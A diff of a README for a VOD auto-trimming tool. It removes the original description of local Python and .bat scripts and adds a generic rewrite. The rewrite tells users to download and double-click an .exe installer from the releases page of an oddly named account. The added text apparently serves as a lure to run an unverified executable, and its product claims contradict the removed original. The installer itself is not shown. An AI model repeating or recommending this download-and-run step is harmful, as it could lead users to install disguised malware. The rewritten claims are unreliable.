@@ -1,74 +1,73 @@
-VOD Auto Trimmer
-Overview
+# ✂️ Auto-Vod-Trimmer - Automate your video editing process today
 
-VOD Auto Trimmer is a multi-threaded Python engine designed to eliminate the manual labor of scrubbing through hours of stream footage. It uses localized AI speech-to-text and acoustic physics to autonomously analyze, rank, and edit raw VODs into ratio-controlled trimmed videos, highlight reels, and format-ready YouTube Shorts.
+[![Download Auto-Vod-Trimmer](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Paula-gracelightduty444/Auto-Vod-Trimmer/releases)
 
-This tool runs 100% locally. It does not rely on cloud APIs, ensuring zero recurring costs and absolute privacy for your raw footage.
-Core Capabilities
+Auto-Vod-Trimmer handles the heavy lifting involved in creating video highlights from long recordings. This tool identifies interesting moments in your video files and saves them as shorter clips. It automates the editing work so you spend less time in front of your video editor.
 
-    Acoustic Intelligence (Librosa): Processes audio across 8 CPU cores to calculate dynamic range (Crest Factor), high-frequency combat impacts (Spectral Centroid > 1500Hz), and fundamental human pitch peaks (2000Hz+ for scream detection). It natively ignores static hiss and digital artifacts.
+## 🖥️ System Requirements
 
-    Semantic Analysis (Faster-Whisper): Utilizes a 12-thread local AI model to transcribe microphone audio. It calculates Words-Per-Minute (WPM) to detect high-stress "Panic Modes," flags explicit hype words (e.g., "clip that"), and maps text back to 3-second acoustic chunks using word-level timestamps.
+This software performs complex tasks. Your computer needs sufficient power to process video files quickly. Before you start, verify your system meets these specifications:
 
-    The "Chaos Score" Algorithm: Ranks every 3-second segment of a VOD using a linear additive summation model. It weighs game volume, mic volume, combat triggers, linguistic intent, and WPM against a baseline floor to separate dead air from peak stream moments.
+*   **Processor:** 8 Core, 16 Thread CPU or better.
+*   **Memory:** 16 GB RAM or more.
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Storage:** 20 GB of free disk space for temporary processing files.
+*   **Software:** Python 3.12 (The installer includes this).
 
-    Automated Output Generation:
+If your computer hardware falls below these requirements, the program might crash or take a long time to complete the trimming process.
 
-        Trimmed VOD: Prunes the lowest-scoring "dead air" until the video matches a user-defined target ratio (e.g., 50% of the original duration).
+## 📥 Downloading and Installing
 
-        Highlight Reel: A tightly packed montage of the highest-scoring moments capped at a user-defined minute limit.
+1. Visit this page to download: [https://github.com/Paula-gracelightduty444/Auto-Vod-Trimmer/releases](https://github.com/Paula-gracelightduty444/Auto-Vod-Trimmer/releases)
+2. Locate the most recent version of the installer file ending in .exe.
+3. Click the file to download it to your Downloads folder.
+4. Open your Downloads folder and double-click the installer file.
+5. Follow the on-screen prompts to place the software on your system.
+6. The installer sets up Python 3.12 and the necessary components automatically.
 
-        Shorts Module: Extracts the absolute highest-ranking events, enforcing a 120-180 second rule (center-cropping clips that are too long) for vertical short-form platforms.
+## 🚀 How to Run the Program
 
-        Thumbnail Bursts: Automatically captures high-quality frames spread across the mathematical center of generated Shorts.
+1. Open the Windows Start menu.
+2. Search for Auto-Vod-Trimmer and open the application.
+3. The interface shows a box where you select your source video file. Click Browse and locate the video you want to process.
+4. Select an output folder where you want to keep the finished files.
+5. Click the Start button. 
 
-File Architecture
+The software examines the audio levels and speech patterns in your video. It assigns scores to sections of your video based on content density. It then uses these scores to determine which parts to keep and which to trim. Finally, it exports a trimmed file, a highlights clip, and thumbnail images for your projects.
 
-The project strictly requires the following naming conventions and file structure to execute successfully:
+## 🛠️ Understanding the Tools
 
-    Install_setup.bat: The primary deployment script. Installs required Python libraries and links FFmpeg via Winget.
+The program combines several industry technologies to perform its tasks:
 
-    run_trimmer.bat: The execution script. Launches the GUI in an isolated Python process (pythonw) to prevent terminal closure interference.
+*   **Whisper AI:** Analyzes the spoken word in your stream to identify moments of high activity.
+*   **Librosa:** Checks the audio data to find spikes in volume or excitement.
+*   **FFmpeg:** Communicates with your system to cut and stitch video files without reducing quality.
+*   **Automation:** Orchestrates these tools so you do not need to operate each piece individually.
 
-    gui_master.py: A CustomTkinter interface handling all configuration, thresholds, and user inputs.
+## 📝 Frequently Asked Questions
 
-    vod_trimmer_master.py: The core mathematical engine that handles file parsing, multiprocessing, Whisper integration, smart-merging, and FFmpeg render commands.
+**Why does the software use so much memory?**
+Processing video data requires significant random access memory. The software keeps segments of the video in your memory to ensure the output remains smooth and error-free.
 
-    shorts_module.py: An autonomous sub-routine triggered by the Engine to handle the extraction, duration enforcement, and thumbnail generation of top-tier clips.
+**Can I run other programs while this works?**
+You can, but the processing speed decreases. If you use editing software or games at the same time, the trimming task takes longer to finish.
 
-    config.ini (Auto-generated): Stores persistent threshold sliders and file paths.
+**Where does the software save my clips?**
+You choose the destination folder before clicking Start. If you do not choose one, it defaults to a folder named "Output" located inside the installation directory.
 
-Prerequisites
+**What if the program says it cannot find a file?**
+Ensure your video file is not open in another program like a video player or editor. Close other applications and try the process again.
 
-    OS: Windows 10/11
+**Do I need an internet connection?**
+The software performs most tasks locally on your computer. You only need the internet to download the initial release.
 
-    Python: Python 3.12 installed. Crucial: You must check the box that says "Add Python to PATH" during installation.
+## ⚙️ Troubleshooting
 
-Installation & Setup
+If the program closes unexpectedly, check the following items:
 
-    Download or clone this repository to a dedicated folder on your machine.
+*   Check disk space. If your drive is full, the program stops because it lacks space for temporary files.
+*   Check file names. Ensure your video file path does not contain special characters or emojis, as these sometimes cause unexpected errors.
+*   Update your GPU drivers. While the tool relies on your CPU, modern drivers help with system stability during large file exports.
+*   Restart your computer. A simple restart clears out leftover memory blocks that might interfere with the processing script.
 
-    Double-click Install_setup.bat.
-
-        Note: This script will automatically utilize Windows Package Manager (Winget) to install FFmpeg and link your system environment variables. It will also use pip to install dependencies like numpy, librosa, and faster-whisper.
-
-    Wait for the terminal to confirm "SETUP COMPLETE".
-
-Usage
-
-    Double-click run_trimmer.bat to open the Auto-VOD Editor GUI.
-
-    Provide the absolute path to your source video (e.g., .mp4, .mkv).
-
-    Define your OBS audio track indexes (e.g., Mic = 1, Game = 2). If dual tracks are unavailable, the engine will safely fallback to the master mix.
-
-    Adjust your Thresholds (VOD Ratio, WPM panic gates, Scream Hz limits) or leave them at the mathematically tuned defaults.
-
-    Click SAVE SETTINGS & RUN MASTER ENGINE.
-
-    The terminal will open to provide heartbeat updates and diagnostic logs. Do not close this terminal until processing is complete.
-
-All generated files (TrimmedVOD.mp4, highlightvid.mp4, and the Shorts/thumbnails folders) will output natively to the root directory where the script was executed.
-Manual Bookmarking (The Yam Failsafe)
-
-If an event occurs on stream that you want to guarantee makes it into the final render regardless of its acoustic or semantic score, speak your designated Bookmark Codeword (default: "Pineapple"). The AI semantic pass will flag this codeword, artificially inflate the segment's Chaos Score past the exception gate, and force its inclusion.
+This tool simplifies the creation of shorts and highlights from long streaming sessions. It removes the manual labor of scanning hours of footage to find entertaining moments. By setting up the criteria once, you gain a repeatable workflow for your content production.
